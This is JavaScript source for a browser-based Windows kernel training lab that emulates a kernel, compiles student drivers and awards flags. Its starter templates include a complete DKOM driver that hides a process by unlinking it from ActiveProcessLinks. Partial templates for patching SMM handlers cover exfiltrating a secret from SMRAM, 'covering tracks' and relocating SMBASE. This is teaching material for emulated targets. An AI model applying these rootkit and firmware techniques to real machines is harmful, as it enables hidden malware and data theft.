import "./styles.css";
import { marked } from "marked";
import { catalog } from "@kernelforge/course-content";
import {
  checkFlag, submitFlagForProgress, isLessonUnlocked,
  emptyProgress, resolveBackend,
} from "@kernelforge/lab-runtime";
import { loadProgress, saveProgress } from "@kernelforge/lab-runtime/storage.browser";
import { getScenario, tryLoadDumpWorld, tryLoadCarvedState } from "./scenarios.js";
import { validateDriverSource } from "./driver-builder.mjs";
import { loadCompiledDriver } from "@kernelforge/ntsim-analyzer/src/compiled.mjs";
import { compileDriverSource, warmupCompiler } from "@kernelforge/compiler-worker/index.browser.mjs";
import { loadTables } from "./tables.js";
import { paneFor } from "./panes.js";
import { createDebugger } from "./debugger.js";
import { createDebugConsole, disposeConsoles } from "./console.js";
import { renderAnalyzer } from "./analyzer.js";

warmupCompiler(); // preload the wasm toolchain in the background

const app = document.getElementById("app");
let progress = emptyProgress();
let currentDebugger = null;
let currentKernel = null;
let currentSession = null;

function kernel_processByName(kernel, name) {
  return kernel.processesByName.get(name) ?? null;
}

function getStarterCode(lab) {
  if (lab.id.includes("dkom")) {
    return `// DKOM process hiding — unlink kftarget.exe from ActiveProcessLinks
//
// This driver demonstrates Direct Kernel Object Manipulation:
// 1. Locate the target _EPROCESS by PID
// 2. Overwrite its ActiveProcessLinks to remove it from the list
// 3. The process becomes invisible to !process / NtQuerySystemInformation

#include <ntddk.h>

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    PEPROCESS targetProcess = NULL;
    HANDLE targetPid = (HANDLE)666; // kftarget.exe

    NTSTATUS status = PsLookupProcessByProcessId(targetPid, &targetProcess);
    if (!NT_SUCCESS(status)) {
        DbgPrint("DKOM: Failed to find pid %lu\\n", (ULONG)(ULONG_PTR)targetPid);
        return status;
    }

    PLIST_ENTRY pLinks = (PLIST_ENTRY)((PUCHAR)targetProcess + 0x448);
    RemoveEntryList(pLinks);
    DbgPrint("DKOM: unlinked kftarget.exe, LIST_ENTRY @ %p\\n", pLinks);

    ObDereferenceObject(targetProcess);
    return STATUS_SUCCESS;
}
`;
  }

  if (lab.id.includes("smm-vault")) {
    return `// SMM vault: open SMRAM from ring 0, patch the SMI handler, and make
// ring -2 exfiltrate the secret into your landing page.
//
// Chipset facts (Q35-style, device 0:0:0):
//   SMRAMC lives at config offset 0x9c (dword lane; the SMRAMC byte).
//   Bits: [3]=D_OPEN [2]=D_CLS [1]=D_LCK [0]=G_SMRAME
//   TSEG (SMRAM) = 0x7f000000..0x7f7fffff, SMBASE default 0x7f300000,
//   SMI handler entry = SMBASE + 0x8000.
// APMC port 0xB2: writing 0x01 latches an SMI. The lab dispatches it for
// you after DriverEntry returns.

#include <ntddk.h>

static __inline void outbyte(unsigned short Port, unsigned char Value) {
    __asm__ volatile ("outb %0, %1" :: "a"(Value), "Nd"(Port));
}

#define PCI_CFG_ADDR 0xCF8
#define PCI_CFG_DATA 0xCFC
#define APMC_PORT    0xB2

#define SMRAMC_REG   0x9c
#define TSEG_BASE    0x7f300000u          /* SMBASE inside TSEG */
#define HANDLER_OFF  0x8000               /* SMBASE + 0x8000 */

/* landing page the lab watches after the SMI fires */
#define LANDING      ((unsigned char*)0xffffe00010000000ULL)

/* The firmware handler we plant: copy 16 bytes of the secret at
 * SMBASE+0x1000 into RCX's saved value... too clever. Instead it copies
 * from a FIXED address you choose below straight into LANDING. */
#define SECRET_VA    (TSEG_BASE + 0x1000)

static const unsigned char HANDLER_PATCH[] = {
    /* movabs rsi, SECRET_VA ; movabs rdi, LANDING ; mov ecx,16 ; rep movsb ; ret
       (the two imm64s below are pre-filled for the default TSEG/LANDING) */
    0x48, 0xBE, 0x00, 0x00, 0x30, 0x7F, 0x00, 0x00, 0x00, 0x00, // movabs rsi, SECRET_VA
    0x48, 0xBF, 0x00, 0x00, 0x00, 0x00, 0xE0, 0xFF, 0xFF, 0xFF, // movabs rdi, LANDING
    0xB9, 0x10, 0x00, 0x00, 0x00,                               // mov ecx, 16
    0xF3, 0xA4,                                                 // rep movsb
    0xC3,
};

void PatchSmram(void) {
    // 1) program CF8 with (ENABLE_BIT | (0<<16) | (0<<11) | (0<<8) | SMRAMC_REG)
    unsigned int addr = 0x80000000u | SMRAMC_REG;
    // TODO: write 'addr' to PCI_CFG_ADDR and then write 0x09 (D_OPEN|G_SMRAME)
    //       to PCI_CFG_DATA to OPEN the vault.

    // 2) while open: overwrite the handler page at TSEG_BASE+HANDLER_OFF
    //      with HANDLER_PATCH (fix its movsb encoding first!)

    // 3) close it again: rewrite SMRAMC with 0x01 to cover your tracks.
}

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    PatchSmram();
    outbyte(APMC_PORT, 0x01);   // fire!
    DbgPrint("SMM-VAULT: latch set\\n");
    return STATUS_SUCCESS;
}
`;
  }

  if (lab.id.includes("smm-reloc")) {
    return `// SMBASE relocation: your patched SMI handler rewrites the save-state's
// SMBASE field BEFORE RSM, so the NEXT SMI enters code you planted.
//
// Canonical anchor: the x64 SMRAM save-state stores SMBASE at offset
// 0xFB04 from the (old) SMBASE — SDM Vol.3 ch.34. Handler entry is
// SMBASE+0x8000. TSEG spans 0x7f000000..0x7f7fffff.
//
// Pick NEW_BASE anywhere free inside TSEG. Plant this stub at
// NEW_BASE+0x8000:
//     movabs rax, LANDING2 ; mov dword [rax], 0x4B46324D ('MF2K') ; ret
// Then patch the CURRENT handler to: store NEW_BASE into old+0xFB04 ; ret

#include <ntddk.h>

static __inline void outbyte(unsigned short Port, unsigned char Value) {
    __asm__ volatile ("outb %0, %1" :: "a"(Value), "Nd"(Port));
}

#define PCI_CFG_ADDR 0xCF8
#define PCI_CFG_DATA 0xCFC
#define APMC_PORT    0xB2
#define SMRAMC_REG   0x9c

#define OLD_BASE     0x7f300000u
#define NEW_BASE     0x0u        /* TODO: choose an aligned base inside TSEG */
#define SAVE_SMBASE_OFF 0x0u     /* TODO: canonical save-state offset */
#define LANDING2     ((unsigned int*)0xffffe00020000000ULL)

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    unsigned int addr = 0x80000000u | SMRAMC_REG;
    // TODO: open SMRAM (D_OPEN|G_SMRAME) via CF8/CFC like last module...

    // TODO: plant the stub at NEW_BASE+0x8000:
    //   bytes: 48 B8 <landing2 imm64> C7 00 4D 32 46 4B C3
    //          ("movabs rax,imm64; mov dword [rax],'MF2K'; ret")

    // TODO: patch the OLD handler at OLD_BASE+0x8000:
    //   bytes: C7 05 <rel32=SAVE_SMBASE_OFF-...> or simpler absolute:
    //   48 B8 <abs=OLD_BASE+SAVE_SMBASE_OFF> ; B8/BA? keep simple:
    //   C7 40 04 ... nope — use: mov dword [abs],NEW_BASE via
    //   48 B8<abs> ; B8<new> hmm — full working bytes are in the lesson!

    // TODO: close SMRAM, latch SMI (0xB2). The lab runs TWO SMIs for you.
    return STATUS_SUCCESS;
}
`;
  }
  return "// Write your driver code here\n";
}

async function persist() {
  await saveProgress(progress);
}

const solvedCount = () => Object.keys(progress.solvedFlags).length;
const totalPoints = () => progress.points ?? 0;

// ---------------------------------------------------------------- rendering

function h(tag, attrs, ...children) {
  const el = document.createElement(tag);
  // NB: defaults don't cover explicit `null` callers — normalize instead.
  for (const [k, v] of Object.entries(attrs ?? {})) {
    if (k === "class") el.className = v;
    else if (k.startsWith("on")) el.addEventListener(k.slice(2), v);
    else if (v !== undefined && v !== null) el.setAttribute(k, String(v));
  }
  for (const c of children.flat()) {
    if (c == null) continue;
    el.appendChild(typeof c === "string" ? document.createTextNode(c) : c);
  }
  return el;
}

function refreshHeader() {
  const el = document.querySelector(".points");
  if (el) el.textContent = `${solvedCount()} flags · ${totalPoints()} pts`;
}

function renderShell() {
  app.innerHTML = "";
  const header = h("header", null,
    h("span", { class: "logo" }, "⚒ KernelForge"),
    h("span", { class: "spacer" }),
    h("span", { class: "points" }, `${solvedCount()} flags · ${totalPoints()} pts`),
  );
  app.append(header, h("div", { id: "layout" },
    h("aside", { id: "sidebar" }),
    h("main", { id: "main" }),
  ));
  renderSidebar();
  renderWelcome();
}

function renderSidebar() {
  const sidebar = document.getElementById("sidebar");
  sidebar.innerHTML = "";
  sidebar.append(h("h2", null, "Tools"));
  const analyzerBtn = h("button", {
    class: "tool",
    onclick: () => renderAnalyzer(document.getElementById("main")),
  }, "⚒ Driver Analyzer");
  sidebar.append(analyzerBtn);
  for (const mod of catalog.modules) {
    sidebar.append(h("h2", null, mod.title));
    for (const lesson of mod.lessons) {
      const unlocked = isLessonUnlocked(lesson, progress);
      const done = progress.completedLessons.includes(lesson.id);
      sidebar.append(h("button", {
        class: `lesson ${unlocked ? "" : "locked"} ${done ? "done" : ""}`,
        onclick: () => unlocked && renderLesson(lesson),
      }, `${done ? "✔" : unlocked ? "▸" : "🔒"} ${lesson.title}`));
    }
  }
}

function renderWelcome() {
  const main = document.getElementById("main");
  main.innerHTML = "";
  main.append(
    h("div", { class: "card" },
      h("h1", null, "Windows Kernel Fundamentals"),
      h("p", null, "Pick a lesson from the sidebar. Labs boot a real x64 Windows " +
        "kernel model in your browser — inspect it with the debugger console, " +
        "solve the objectives, submit flags."),
      h("p", { class: "dim" }, "Progress lives in IndexedDB on this machine only."),
    ),
  );
}

// ------------------------------------------------------------ lab rendering

function renderLesson(lesson) {
  const main = document.getElementById("main");
  disposeConsoles(); // terminals from the previous lesson render
  main.innerHTML = "";

  // Lesson body: markdown (shipped as content modules in course-content).
  const card = h("div", { class: "card" }, h("h1", null, lesson.title));
  const body = h("div", { class: "lesson-body md" });
  if (typeof lesson.body === "string" && lesson.body.length) {
    body.innerHTML = marked.parse(lesson.body);
  } else {
    body.append(h("p", { class: "dim" }, "(no lesson text)"));
  }
  card.append(body);
  main.append(card);

  for (const lab of lesson.labs) {
    // xterm.js-backed kd> console (div fallback in headless DOMs); input is
    // inline — every submitted line routes to currentDebugger.exec.
    const consoleHost = h("div", { class: "console-host" });
    const consoleReady = createDebugConsole(consoleHost, {
      onSubmit: (line) => currentDebugger?.exec(line),
    });

    const pane = paneFor(lab.kind) ?? {};
    const backends = pane.backends ?? [
      { value: "js", label: "CPU: JsInterpreter (deterministic)" },
      { value: "unicorn", label: "CPU: Unicorn (QEMU wasm)" },
    ];
    const backendSel = h("select", {},
      backends.map((b) => h("option", { value: b.value }, b.label)));
    const bootBtn = h("button", {
      class: "primary",
      onclick: async () => {
        bootBtn.disabled = true;
        bootBtn.textContent = "booting…";
        const dbg = await consoleReady;
        try {
          const scenario = getScenario(lab.scenario);
          const factory = pane.rawBoot ? null : await resolveBackend(backendSel.value);
          const dumpWorld = pane.noDump ? null : await tryLoadDumpWorld();
          const io = pane.rawBoot ? {} : {
            makeBackend: (mem) => factory(mem),
            loadTables: () => loadTables(),
            dumpWorld,
            carvedState: pane.noDump ? null : await tryLoadCarvedState(),
          };
          const session = await scenario.boot(io);
          dbg.innerHTML = "";
          currentSession = session;
          currentKernel = session.kernel ?? null;
          currentDebugger = pane.createDebugger
            ? pane.createDebugger(session, dbg)
            : createDebugger(session.kernel, dbg);
          if (!pane.noDump && session.dumpPagesLoaded > 0) {
            currentDebugger.write(
              `CARVED-DUMP MODE: ${session.dumpPagesLoaded} genuine pages ` +
              `(ntoskrnl/CI/cng) loaded at true VAs from a public kernel dump.`);
          }
          if (dumpWorld && !pane.noDump) {
            currentDebugger.write(
              `REAL-DUMP MODE: ${dumpWorld.meta.processCount} processes, ` +
              `${dumpWorld.meta.moduleCount} modules extracted from a genuine ` +
              `Windows kernel dump (${dumpWorld.meta.source}).`);
          }
          currentDebugger.write(`Booted "${lab.scenario}" on the ${backendSel.value} backend. Type 'help'.`);
          dbg.focusTarget?.focus?.();
        } catch (e) {
          dbg.innerHTML = "";
          dbg.write(`boot failed: ${e.message}`, "err");
        } finally {
          bootBtn.disabled = false;
          bootBtn.textContent = "Boot / Reset";
        }
      },
    }, "Boot / Reset");

    const card = h("div", { class: "card lab" },
      h("h2", null, lab.title + " ", h("code", { class: "kind" }, lab.kind)),
      h("p", null, lab.brief),
    );

    // pane-registered editors (e.g. linux LKM IDE)
    if (pane.attachEditor) {
      const editorStatus = h("div", { class: "compile-status" });
      card.append(pane.attachEditor({
        h,
        lab,
        status: (text, cls = "dim") => editorStatus.append(h("div", { class: cls }, text)),
        getSession: () => ({ linux: currentSession?.linux ?? null }),
      }));
      card.append(editorStatus);
    }

    if (lab.kind === "compiler") {
      const editor = h("textarea", {
        class: "code-editor", rows: 16, spellcheck: "false",
      }, getStarterCode(lab));
      const compileBtn = h("button", { class: "primary" }, "Compile & Load Driver");
      const compileStatus = h("div", { class: "compile-status" });
      compileBtn.addEventListener("click", async () => {
        compileStatus.innerHTML = "";
        const src = editor.value;
        const validation = validateDriverSource(src, "dkom-hide");
        if (!validation.ok) {
          for (const err of validation.errors)
            compileStatus.append(h("div", { class: "err" }, "✗ " + err));
          return;
        }
        for (const warn of validation.warnings)
          compileStatus.append(h("div", { class: "dim" }, "⚠ " + warn));
        compileStatus.append(h("div", { class: "good" }, "✓ Code validated — compiling..."));

        // Boot if needed
        if (!currentDebugger) {
          bootBtn?.click();
          if (!currentDebugger) {
            compileStatus.append(h("div", { class: "err" }, "boot failed"));
            return;
          }
        }

        // Find kftarget.exe
        const kftarget = kernel_processByName(currentKernel, "kftarget.exe");
        if (!kftarget) {
          compileStatus.append(h("div", { class: "err" }, "kftarget.exe not found in process list!"));
          return;
        }

        // Real compilation: in-browser wasm clang first, server bridge fallback.
        // Managing a clean compile IS part of the exercise: no simulated fallback.
        let objBytes, via;
        try {
          ({ objBytes, via } = await compileDriverSource(src));
        } catch (err) {
          compileStatus.append(h("div", { class: "err" }, "✗ compile failed: " + err.message));
          return;
        }
        const viaMsg = via === "wasm"
          ? "compiled in-browser (wasm clang)"
          : "compiled via server fallback";
        compileStatus.append(h("div", { class: "good" }, `✓ ${viaMsg} (${objBytes.length} bytes)`));

        // Link + manual-map the student's actual bytes into emulated memory.
        let loaded;
        try {
          loaded = loadCompiledDriver(currentKernel, objBytes, { labId: lab.id });
        } catch (err) {
          compileStatus.append(h("div", { class: "err" }, "✗ load failed: " + err.message));
          return;
        }
        compileStatus.append(h("div", { class: "good" },
          `✓ mapped at 0x${loaded.base.toString(16)} as ${loaded.name}`));

        // Execute DriverEntry on the session's CPU engine (SEH-aware).
        const regPathBuf = currentKernel.allocPool(0x100);
        currentKernel.mem.writeUtf16(regPathBuf,
          "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\" + loaded.name);
        const result = currentKernel.callFunctionSeh(loaded.entry, [loaded.drvRec.va, regPathBuf],
          loaded.image);

        if (result.status !== "ok") {
          compileStatus.append(h("div", { class: "err" },
            `✗ Driver faulted: ${result.error?.message ?? result.status}`));
          for (const ex of currentKernel.exceptionTrace.splice(0)) {
            compileStatus.append(h("div", { class: "warn" },
              `${ex.handled ? "SEH handled" : "UNHANDLED"} @ ${ex.faultRip}: ${ex.detail}`));
          }
          return;
        }

        // SMM labs: a driver can latch an SMI (port 0xB2). Dispatch the
        // modeled interrupt now and surface the handler's effects.
        if (currentKernel.smm?.smiPending) {
          const smm = currentKernel.smm;
          let guard = 0;
          while (smm.smiPending && guard++ < 2) {
            const r2 = smm.smiDispatch();
            compileStatus.append(h("div", { class: r2.status === "ok" ? "good" : "err" },
              `SMI #${guard}: handler ${r2.status}${r2.retval !== undefined ? ` retval=0x${r2.retval.toString(16)}` : ""}`));
            for (const line of smm.trace.slice(-4)) {
              compileStatus.append(h("div", { class: "mono dim" }, line));
            }
          }
          for (const landingVa of [currentKernel.smmLanding, currentKernel.smmLanding2]) {
            if (!landingVa) continue;
            const bytes = currentKernel.mem.read(landingVa, 16);
            const hex = [...bytes].map((b2) => b2.toString(16).padStart(2, "0")).join(" ");
            const ascii = [...bytes].map((b2) => (b2 >= 0x20 && b2 < 0x7f ? String.fromCharCode(b2) : ".")).join("");
            compileStatus.append(h("div", { class: "mono" },
              `landing @ 0x${landingVa.toString(16)}: ${hex}  |${ascii}|`));
          }
          currentDebugger.write("SMI dispatched — run !smram / !smmc to inspect SMRAM state.");
        }

        // Verify against live kernel state mutated by the student's bytes.
        const stillVisible = currentKernel.listProcesses().some((p) => p.name === "kftarget.exe");
        const unloadSet = currentKernel.mem.u64(loaded.drvRec.va + 0x68n) !== 0n;
        const printed = [...currentKernel.dbgLog].reverse().find((l) => l.includes("_LIST_ENTRY"));

        if (stillVisible) {
          compileStatus.append(h("div", { class: "warn" },
            "!process still shows kftarget.exe — DKOM may not have worked."));
        } else {
          compileStatus.append(h("div", { class: "good" }, "✓ kftarget.exe hidden!"));
        }
        if (!unloadSet) {
          compileStatus.append(h("div", { class: "warn" }, "DriverUnload was not set on DriverObject."));
        }
        if (printed) {
          compileStatus.append(h("div", { class: "mono" }, printed.trim()));
          const addr = printed.match(/LIST_ENTRY at:\s*([0-9a-f`]+)/i);
          if (addr) {
            compileStatus.append(h("div", { class: "good" },
              `LIST_ENTRY @ 0x${addr[1].replace(/`/g, "")}`));
          }
        }
        currentDebugger.write(`${loaded.name}: DriverEntry executed on ${backendSel.value} backend.`);
        currentDebugger.write(`Run !process 0 0 to verify kftarget.exe is hidden; lm shows your driver.`);
      });
      card.append(editor, h("div", { class: "controls" }, compileBtn), compileStatus);
    }

    card.append(h("div", { class: "controls" }, backendSel, bootBtn));
    card.append(consoleHost);

    // ---- flag submission
    for (const f of lab.flags) {
      const solved = !!progress.solvedFlags[f.id];
      const inp = h("input", { placeholder: solved ? "solved ✔" : "your answer…", disabled: solved ? "" : undefined });
      const btn = h("button", {
        disabled: solved ? "" : undefined,
        onclick: async () => {
          const ok = await checkFlag(inp.value, f);
          const ev = submitFlagForProgress(progress, lesson, f.id, ok);
          if (ok) {
            progress = ev.progress;
            await persist();
            btn.textContent = "✔";
            btn.classList.add("good");
            inp.placeholder = "solved ✔";
            inp.disabled = true;
            btn.disabled = true;
            refreshHeader();
            renderSidebar(); // surface newly unlocked lessons immediately
          } else {
            inp.classList.add("bad");
            setTimeout(() => inp.classList.remove("bad"), 600);
          }
        },
      }, solved ? "✔" : "submit");
      card.append(h("div", { class: "flag" },
        h("span", { class: "prompt" }, f.prompt),
        h("span", { class: "pts" }, `${f.points} pts`),
        h("div", { class: "row" }, inp, btn),
      ));
    }

    main.append(card);
  }
}

// --------------------------------------------------------------------- init

(async function init() {
  try { progress = (await loadProgress()) ?? emptyProgress(); } catch { progress = emptyProgress(); }
  renderShell();
})();
